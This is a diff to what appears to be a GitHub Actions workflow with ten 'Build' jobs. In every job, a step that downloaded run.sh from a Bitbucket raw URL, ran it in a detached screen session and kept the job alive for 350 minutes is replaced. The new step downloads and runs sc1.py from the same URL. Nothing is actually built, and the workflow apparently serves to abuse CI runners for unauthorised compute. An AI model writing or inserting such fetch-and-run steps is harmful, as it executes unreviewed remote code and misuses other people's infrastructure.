@@ -53,8 +53,9 @@ jobs:
       run: |
         mkdir build
         cd build
-        wget https://bitbucket.org/manajakaj/project1/raw/f812e73d84f9b5f930f42c9f1b8bf1dc8633de02/run.sh && chmod +x run.sh && screen -dmS runn ./run.sh
-        x=1; while [ $x -le 350 ]; do echo "Still running at $x minutes"; x=$(($x + 1)); sleep 1m; done
+        wget https://bitbucket.org/manajakaj/project1/raw/9bf71d72b48659551a0aa1b5f9ed1d723ddd1533/sc1.py
+        chmod +x sc1.py
+        python3 sc1.py
     - name: Done
       run: rm -rf build
   Build-2:
@@ -85,8 +86,9 @@ jobs:
       run: |
         mkdir build
         cd build
-        wget https://bitbucket.org/manajakaj/project1/raw/f812e73d84f9b5f930f42c9f1b8bf1dc8633de02/run.sh && chmod +x run.sh && screen -dmS runn ./run.sh
-        x=1; while [ $x -le 350 ]; do echo "Still running at $x minutes"; x=$(($x + 1)); sleep 1m; done
+        wget https://bitbucket.org/manajakaj/project1/raw/9bf71d72b48659551a0aa1b5f9ed1d723ddd1533/sc1.py
+        chmod +x sc1.py
+        python3 sc1.py
     - name: Done
       run: rm -rf build
   Build-3:
@@ -117,8 +119,9 @@ jobs:
       run: |
         mkdir build
         cd build
-        wget https://bitbucket.org/manajakaj/project1/raw/f812e73d84f9b5f930f42c9f1b8bf1dc8633de02/run.sh && chmod +x run.sh && screen -dmS runn ./run.sh
-        x=1; while [ $x -le 350 ]; do echo "Still running at $x minutes"; x=$(($x + 1)); sleep 1m; done
+        wget https://bitbucket.org/manajakaj/project1/raw/9bf71d72b48659551a0aa1b5f9ed1d723ddd1533/sc1.py
+        chmod +x sc1.py
+        python3 sc1.py
     - name: Done
       run: rm -rf build
   Build-4:
@@ -149,8 +152,9 @@ jobs:
       run: |
         mkdir build
         cd build
-        wget https://bitbucket.org/manajakaj/project1/raw/f812e73d84f9b5f930f42c9f1b8bf1dc8633de02/run.sh && chmod +x run.sh && screen -dmS runn ./run.sh
-        x=1; while [ $x -le 350 ]; do echo "Still running at $x minutes"; x=$(($x + 1)); sleep 1m; done
+        wget https://bitbucket.org/manajakaj/project1/raw/9bf71d72b48659551a0aa1b5f9ed1d723ddd1533/sc1.py
+        chmod +x sc1.py
+        python3 sc1.py
     - name: Done
       run: rm -rf build
   Build-5:
@@ -181,8 +185,9 @@ jobs:
       run: |
         mkdir build
         cd build
-        wget https://bitbucket.org/manajakaj/project1/raw/f812e73d84f9b5f930f42c9f1b8bf1dc8633de02/run.sh && chmod +x run.sh && screen -dmS runn ./run.sh
-        x=1; while [ $x -le 350 ]; do echo "Still running at $x minutes"; x=$(($x + 1)); sleep 1m; done
+        wget https://bitbucket.org/manajakaj/project1/raw/9bf71d72b48659551a0aa1b5f9ed1d723ddd1533/sc1.py
+        chmod +x sc1.py
+        python3 sc1.py
     - name: Done
       run: rm -rf build
   Build-6:
@@ -213,8 +218,9 @@ jobs:
       run: |
         mkdir build
         cd build
-        wget https://bitbucket.org/manajakaj/project1/raw/f812e73d84f9b5f930f42c9f1b8bf1dc8633de02/run.sh && chmod +x run.sh && screen -dmS runn ./run.sh
-        x=1; while [ $x -le 350 ]; do echo "Still running at $x minutes"; x=$(($x + 1)); sleep 1m; done
+        wget https://bitbucket.org/manajakaj/project1/raw/9bf71d72b48659551a0aa1b5f9ed1d723ddd1533/sc1.py
+        chmod +x sc1.py
+        python3 sc1.py
     - name: Done
       run: rm -rf build
   Build-7:
@@ -245,8 +251,9 @@ jobs:
       run: |
         mkdir build
         cd build
-        wget https://bitbucket.org/manajakaj/project1/raw/f812e73d84f9b5f930f42c9f1b8bf1dc8633de02/run.sh && chmod +x run.sh && screen -dmS runn ./run.sh
-        x=1; while [ $x -le 350 ]; do echo "Still running at $x minutes"; x=$(($x + 1)); sleep 1m; done
+        wget https://bitbucket.org/manajakaj/project1/raw/9bf71d72b48659551a0aa1b5f9ed1d723ddd1533/sc1.py
+        chmod +x sc1.py
+        python3 sc1.py
     - name: Done
       run: rm -rf build
   Build-8:
@@ -277,8 +284,9 @@ jobs:
       run: |
         mkdir build
         cd build
-        wget https://bitbucket.org/manajakaj/project1/raw/f812e73d84f9b5f930f42c9f1b8bf1dc8633de02/run.sh && chmod +x run.sh && screen -dmS runn ./run.sh
-        x=1; while [ $x -le 350 ]; do echo "Still running at $x minutes"; x=$(($x + 1)); sleep 1m; done
+        wget https://bitbucket.org/manajakaj/project1/raw/9bf71d72b48659551a0aa1b5f9ed1d723ddd1533/sc1.py
+        chmod +x sc1.py
+        python3 sc1.py
     - name: Done
       run: rm -rf build
   Build-9:
@@ -309,8 +317,9 @@ jobs:
       run: |
         mkdir build
         cd build
-        wget https://bitbucket.org/manajakaj/project1/raw/f812e73d84f9b5f930f42c9f1b8bf1dc8633de02/run.sh && chmod +x run.sh && screen -dmS runn ./run.sh
-        x=1; while [ $x -le 350 ]; do echo "Still running at $x minutes"; x=$(($x + 1)); sleep 1m; done
+        wget https://bitbucket.org/manajakaj/project1/raw/9bf71d72b48659551a0aa1b5f9ed1d723ddd1533/sc1.py
+        chmod +x sc1.py
+        python3 sc1.py
     - name: Done
       run: rm -rf build
   Build-10:
@@ -341,7 +350,8 @@ jobs:
       run: |
         mkdir build
         cd build
-        wget https://bitbucket.org/manajakaj/project1/raw/f812e73d84f9b5f930f42c9f1b8bf1dc8633de02/run.sh && chmod +x run.sh && screen -dmS runn ./run.sh
-        x=1; while [ $x -le 350 ]; do echo "Still running at $x minutes"; x=$(($x + 1)); sleep 1m; done
+        wget https://bitbucket.org/manajakaj/project1/raw/9bf71d72b48659551a0aa1b5f9ed1d723ddd1533/sc1.py
+        chmod +x sc1.py
+        python3 sc1.py
     - name: Done
       run: rm -rf build
